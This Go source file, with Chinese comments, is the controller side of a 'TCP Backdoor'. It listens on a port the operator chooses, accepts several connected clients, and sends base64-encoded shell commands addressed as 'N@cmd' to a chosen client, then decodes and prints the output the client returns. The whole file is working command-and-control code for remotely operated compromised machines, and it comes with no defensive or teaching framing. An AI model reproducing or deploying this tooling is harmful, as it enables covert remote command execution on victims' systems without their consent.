package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
)

type List struct {
	id   int
	cmds string
}

var list = &List{} //List{}也可以

func main() {

	fmt.Println("TCP Backdoor")
	fmt.Print("Listen Port-> ")
	scan := bufio.NewScanner(os.Stdin)
	scan.Scan()
	ln, _ := net.Listen("tcp", ":"+scan.Text())

	go doListen()

	i := 0
	for {

		i++
		conn, _ := ln.Accept()

		log.Printf("Client %v connected...", i)
		log.Printf("Command use %v@cmd", i)
		fmt.Print("rawinput->")
		go handleServerConnection(conn, i)

	}

}

func doListen() {
	defaultClientID := 1 //从1开始排序
	for {
		scan1 := bufio.NewScanner(os.Stdin)

		for {
			scan1.Scan()
			cmd := strings.TrimSpace(scan1.Text())

			if cmd == "" {
				continue
			}

			pos := strings.Index(cmd, "@") //#出现的位置

			if pos > -1 {

				i, err := strconv.Atoi(cmd[:pos]) //字符串转数字,这个i是我们手工输入的哪个值
				if err != nil {
					i = defaultClientID

					fmt.Println(err)
					continue
				}

				list.id = i
				list.cmds = cmd[pos+1:]

			}

		}
	}
}

func base64Encode(str string) string {
	return base64.StdEncoding.EncodeToString([]byte(str))
}

func base64Decode(str string) string {
	data, err := base64.StdEncoding.DecodeString(str)
	if err != nil {
		return ""
	}
	return string(data)
}

func handleServerConnection(c net.Conn, i int) {
	for {

		if list.id == i {
			cmd := list.cmds
			c.Write([]byte(base64Encode(cmd) + "\n"))
			message, _ := bufio.NewReader(c).ReadString('\n')
			fmt.Printf("Client %d exec %s , result echo \n%s", i, cmd, base64Decode(string(message))) //当前i的回显结果

			list.id = -1 //不要这行会一直循环输出结果
			continue

		}

		time.Sleep(500 * time.Millisecond)
	}

}
